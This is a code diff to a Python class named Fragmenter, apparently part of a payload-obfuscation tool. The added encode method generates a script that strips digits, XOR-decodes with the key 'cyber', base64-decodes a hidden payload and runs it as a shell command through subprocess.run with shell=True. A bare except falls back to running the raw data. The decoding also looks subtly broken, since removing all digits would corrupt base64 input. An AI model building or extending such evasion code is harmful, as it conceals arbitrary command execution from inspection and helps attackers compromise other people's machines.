@@ -20,18 +20,44 @@ class Fragmenter:
         self.add_decoys = random.choice([True, False])
     
     def encode(self, payload):
-        """Fragment payload into multiple parts while preserving obfuscated content"""
+        """Fragment payload and create proper decoder"""
         if isinstance(payload, bytes):
             payload = payload.decode('utf-8')
         
-        # For obfuscation chain, just wrap the payload with fragment markers
-        # This preserves the obfuscated content while adding fragmentation layer
-        fragment_wrapper = f'''
-# Fragmented payload execution
-frag_data = """{payload}"""
-exec(frag_data)
+        # Create executable fragment with proper decoding
+        fragment_script = f'''
+# Fragmented payload with decoder
+import base64
+
+def decode_payload():
+    # Obfuscated payload data
+    data = """{payload}"""
+    
+    # Simple decode (reverse junk removal, XOR, base64)
+    # In real implementation, this would be more sophisticated
+    try:
+        # Remove junk characters (numbers)
+        import re
+        cleaned = re.sub(r'[0-9]+', '', data)
+        
+        # XOR decode
+        key = "cyber"
+        if isinstance(cleaned, str):
+            cleaned = cleaned.encode('latin1')
+        decoded = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(cleaned)])
+        
+        # Base64 decode
+        result = base64.b64decode(decoded).decode('utf-8')
+        return result
+    except:
+        return data
+
+# Execute decoded payload
+import subprocess
+command = decode_payload()
+subprocess.run(command, shell=True)
 '''
-        return fragment_wrapper
+        return fragment_script
     
     def _simple_checksum(self, data):
         """Generate simple checksum for fragment validation"""
